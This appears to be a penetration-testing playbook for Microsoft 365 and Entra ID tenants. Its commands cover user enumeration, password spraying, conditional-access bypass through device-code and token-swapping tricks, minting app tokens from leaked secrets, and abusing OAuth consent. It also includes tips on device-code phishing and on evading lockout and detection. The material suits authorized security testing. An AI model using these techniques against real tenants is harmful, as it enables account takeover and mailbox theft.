---
name: microsoft_365
description: Microsoft 365 / Entra ID tenant testing - tenant recon, identity enumeration, OAuth abuse, conditional access bypass, and cross-tenant sharing
---

# Microsoft 365 Tenant

A Microsoft 365 tenant is the organization's identity and SaaS boundary: Entra ID (formerly Azure AD) for authentication, plus Exchange Online, SharePoint/OneDrive, Teams, and the Graph API behind it. The attacker objective is to move from anonymous external reconnaissance to a valid principal, then escalate that principal through misconfigured conditional access, over-permissioned app registrations and OAuth consent, guest/B2B trust, and external sharing into mailbox, file, and directory data. Almost everything is reachable over the public internet by design, so misconfiguration - not exposure - is the vulnerability.

## Attack Surface

**Anonymous (no credentials)**
- Tenant existence and brand: `login.microsoftonline.com/getuserrealm.srf`, `/common/GetCredentialType`, `/<domain>/.well-known/openid-configuration`
- Tenant ID and federation realm from OpenID metadata; associated vanity + `*.onmicrosoft.com` domains
- User/mailbox existence oracles (timing and `IfExistsResult`); presence of DesktopSSO / Seamless SSO / certificate-based auth
- Public SharePoint/OneDrive anonymous "Anyone" links; Teams external/federation policy

**Authenticated as a user**
- Microsoft Graph (`graph.microsoft.com`), Azure AD Graph (legacy), Exchange Web Services / REST
- Default directory read for members; app registrations, enterprise apps, service principals, role assignments
- Self-service: app consent, group membership, device join, MFA registration

**Application / workload identity**
- App registrations and service principals with client secrets/certificates, often over-scoped (Mail.ReadWrite, Directory.ReadWrite.All, Application.ReadWrite.All)
- Managed identities on Azure resources that can read Key Vault / Graph

**Trust edges**
- Guest (B2B) accounts and cross-tenant access settings
- Federated domains (AD FS, third-party IdP) and token-signing trust
- External sharing of SharePoint/OneDrive; Teams external access (federation)

## Recon & Enumeration

Install the toolchain (Kali / Python):
```
pipx install roadrecon                     # ROADtools: Graph/AAD enumeration + GUI
pip install aadinternals 2>/dev/null; pwsh -c 'Install-Module AADInternals -Force'
pipx install o365spray                      # tenant/user enum + password spray (managed)
pip install msgraph-sdk requests msal       # scripted Graph access
go install github.com/dafthack/MSOLSpray@latest 2>/dev/null  # or use the PS module
```

Tenant discovery (no auth):
```
# OpenID config -> tenant ID, token/authorize endpoints, region
curl -s "https://login.microsoftonline.com/contoso.com/.well-known/openid-configuration" | jq '{issuer,authorization_endpoint,token_endpoint,tenant_region_scope}'

# Realm: managed vs federated, NamespaceType, FederationBrandName, AuthURL (AD FS host)
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=user@contoso.com&xml=1"

# Enumerate all domains attached to the tenant (still works via openid metadata pivot)
roadrecon auth --device-code      # or supply creds; then:
roadrecon gather && roadrecon dump
```

User/mailbox existence oracle (rate-limit aware, use sparingly and only in scope):
```
# GetCredentialType: IfExistsResult==0 => account exists, ==1 => not found
curl -s "https://login.microsoftonline.com/common/GetCredentialType" \
  -H 'Content-Type: application/json' \
  -d '{"Username":"alice@contoso.com"}' | jq '{IfExistsResult,ThrottleStatus,EstsProperties}'

# Bulk, throttle-aware
o365spray --enum -U users.txt --domain contoso.com
```

Service surface and CVEs once you have hostnames (Exchange on-prem hybrid, ADFS, sharing portals):
```
subfinder -d contoso.com -all -silent | httpx -silent -title -tech-detect -sc -o live.txt
nuclei -l live.txt -tags microsoft,exchange,adfs,owa,sharepoint -s critical,high -rl 40 -c 20 -j -o m365_nuclei.jsonl
```

Authenticated directory enumeration:
```
# ROADtools (read-only Graph dump) -> roadrecon.db, then query with roadrecon-gui
roadrecon gather
# AADInternals: tenant info, sync status, CA policies, roles
pwsh -c 'Import-Module AADInternals; Get-AADIntTenantDetails; Get-AADIntLoginInformation -Domain contoso.com'
# Direct Graph: who am I, what can I read
TOKEN=...; curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/me/memberOf" | jq .
curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/applications?\$select=appId,displayName,requiredResourceAccess" | jq .
```

## Methodology

1. **Confirm the tenant.** Pull OpenID config + realm for each in-scope domain; record tenant ID, region, federated vs managed, and the AD FS / third-party IdP host if federated.
2. **Map the identity surface anonymously.** Enumerate `*.onmicrosoft.com` and vanity domains, brand name, and whether Seamless SSO / CBA is enabled. Build a candidate user list from OSINT (LinkedIn, breach data, email format), then validate existence via GetCredentialType with conservative throttling.
3. **Get a foothold principal.** Where authorized, password-spray validated users with `o365spray`/`MSOLSpray` (single password, low-and-slow to respect Smart Lockout), or use a captured device-code/consent flow. Always check whether MFA/CA actually gated the successful login.
4. **Enumerate as the principal.** `roadrecon gather` for a full read-only directory snapshot; review members, groups, roles, app registrations, service principals, conditional access policies, and cross-tenant settings.
5. **Hunt over-permission.** Identify app registrations/service principals with high Graph application permissions, owners you control, or stale secrets; identify users who can self-grant consent or own privileged groups.
6. **Test trust edges.** Evaluate guest access scope, external sharing on SharePoint/OneDrive, and Teams federation. Try to read or write resources beyond the principal's intended scope.
7. **Escalate and chain** (below), validating each step with a concrete PoC, then stop at minimal-impact proof.

## Key Weaknesses / Techniques

### Single-factor / spray-able authentication
Legacy auth endpoints and per-user MFA gaps let single-factor logins through. Validate with one password across confirmed users:
```
o365spray --spray -U valid_users.txt -p 'Season2026!' --domain contoso.com --lockout 1
# MSOLSpray reports MFA/CA results per account so you can tell a real foothold from an MFA wall
```
A 200 with a token = foothold; a token-blocked-by-MFA response is still a *valid credential* finding.

### Conditional Access bypass
CA policies frequently scope only to browser/`Browser` client app types or named locations. Probe alternate client apps and device states:
```
# Device-code flow often dodges location/device CA controls
curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/devicecode" \
  -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&scope=https://graph.microsoft.com/.default offline_access"
# Then poll the token endpoint with the returned device_code
```
Verify by reaching a resource (Graph `/me`) that the policy claimed to protect. Test legacy clients (EWS, IMAP/POP), trusted-IP spoofing via `X-Forwarded-For` where the policy keys on it, and family-of-client-IDs token swapping (FOCI refresh tokens issued for one first-party client redeemed for another).

### Illicit consent grant / OAuth app abuse
If user consent is allowed for unverified apps, an attacker app can phish delegated scopes (`Mail.Read`, `Files.ReadWrite.All`, `offline_access`) and persist via refresh tokens. Assess the policy and existing grants:
```
pwsh -c 'Import-Module AADInternals; Get-AADIntTenantDetails'   # consent settings
curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/oauth2PermissionGrants" | jq '.value[]|{clientId,scope,consentType}'
```
Look for `consentType: AllPrincipals` (admin-consented org-wide) on third-party apps and for service principals holding application `Mail.ReadWrite`/`Directory.ReadWrite.All`.

### Over-permissioned app registrations
A service principal with `RoleManagement.ReadWrite.Directory`, `Application.ReadWrite.All`, or `AppRoleAssignment.ReadWrite.All` is effectively Global Admin. If you control an app's owner account or a leaked client secret, mint app-only tokens:
```
curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token" \
  -d "client_id=<appId>&client_secret=<secret>&scope=https://graph.microsoft.com/.default&grant_type=client_credentials" | jq .access_token
```
Find leaked secrets in code/config with `trufflehog filesystem ./repo` and `gitleaks detect -s ./repo`; Azure DevOps/GitHub pipelines are common sources.

### External sharing & guest over-exposure
SharePoint/OneDrive "Anyone with the link" creates unauthenticated access; guest accounts may inherit broad directory read. Test:
```
# Anonymous link reachability (no auth header)
curl -s -I "https://contoso-my.sharepoint.com/:b:/g/personal/<token>"
# As a guest, attempt directory read beyond your intended scope
curl -s -H "Authorization: Bearer $GUEST_TOKEN" "https://graph.microsoft.com/v1.0/users?\$top=999" | jq '.value|length'
```

### Federation / token-signing trust (AD FS)
A federated domain trusts an external token signer. If AD FS keys leak, "Golden SAML" forges any user. Confirm the federation host from realm output and check it for `nuclei -tags adfs` and known CVEs; assess whether a non-existent domain can be added and federated (trust manipulation).

## Validation

1. **Existence claims:** show the raw `IfExistsResult`/realm response and the rate-limit headers, distinguishing a true positive from throttling.
2. **Foothold:** present a redeemed access token's decoded claims (`jwt_tool <token>` -> `aud`, `scp`/`roles`, `upn`) and one authorized Graph read (`/me`, or a single non-sensitive object) proving the token is live.
3. **CA bypass:** show the same resource denied via one client path and reached via another, with the token from the bypass path.
4. **Consent/app-permission:** show the `oauth2PermissionGrants` or `appRoleAssignments` entry plus a single Graph call exercising that exact scope.
5. **External sharing:** show an unauthenticated 200 to a shared object (read only) or a guest reading beyond scope, then stop.
Keep PoCs read-only and minimal: one object, one mailbox header, one directory page.

## False Positives

- `IfExistsResult` noise: a `ThrottleStatus != 0` or repeated identical results mean you are being rate-limited, not enumerating - results are unreliable.
- A successful login that is then **blocked by MFA/CA** is a valid-credential finding but NOT account takeover; label it accurately.
- App registrations with high *delegated* permissions that no user has consented to are latent, not exploitable, until consent exists.
- "Anyone" SharePoint links that are expired or scoped to authenticated org users return 401/403 - not anonymous exposure.
- Default directory member-read is by-design in many tenants; only flag it if it exceeds the tenant's stated least-privilege posture or leaks sensitive attributes.
- Service principals owned by Microsoft first-party apps with broad permissions are expected; focus on third-party and customer-created apps.

## Chaining & Impact

- Tenant recon -> validated users -> low-and-slow spray -> single-factor foothold -> `roadrecon` directory map -> over-permissioned app -> app-only Global-Admin-equivalent token -> full tenant control.
- Phished delegated consent (`Mail.Read` + `offline_access`) -> persistent refresh token -> long-term mailbox access surviving password reset.
- Leaked client secret in CI/CD -> `client_credentials` app token with `Mail.ReadWrite`/`Files.Read.All` -> org-wide mailbox/file read without any user interaction.
- Guest foothold in a partner tenant + permissive cross-tenant access -> lateral movement into the primary tenant's directory.
- AD FS key compromise -> Golden SAML -> impersonate any user including Global Admin, bypassing MFA entirely.
- Conditional Access gap on legacy auth -> EWS/IMAP access to mailboxes that the web UI policy appeared to protect.

## Pro Tips

1. Always decode the token you receive (`jwt_tool`): the `aud`, `scp` (delegated) vs `roles` (application), and `appid` claims tell you exactly what you can touch - more reliable than guessing scopes.
2. Prefer `roadrecon` for the first authenticated pass: it is read-only, caches to a local DB, and lets you query offline without re-hitting Graph and tripping anomaly detection.
3. Respect Entra Smart Lockout: spray one password per cycle with long delays; bursts lock accounts and burn the engagement. `MSOLSpray` tells you MFA/CA status per hit so you do not waste good creds on MFA walls.
4. FOCI (family-of-client-IDs) refresh tokens are reusable across many first-party clients - a token for one Microsoft app frequently redeems for Graph, Teams, or Outlook scopes.
5. Federated vs managed (from `getuserrealm.srf`) changes everything: federated means the IdP, not Entra, validates passwords, so spraying hits the on-prem AD FS and may dodge cloud lockout - and is louder there.
6. Device-code phishing is high-yield and low-friction: the victim just enters a code at a legitimate Microsoft URL, so it survives many phishing-awareness controls.
7. Check `oauth2PermissionGrants` and enterprise-app `appRoleAssignments` before assuming least privilege - admins often org-wide-consent risky third-party apps and forget them.
8. Cross-tenant access settings and external sharing are the quietest path in; a single over-shared SharePoint site can leak more than a directory dump.
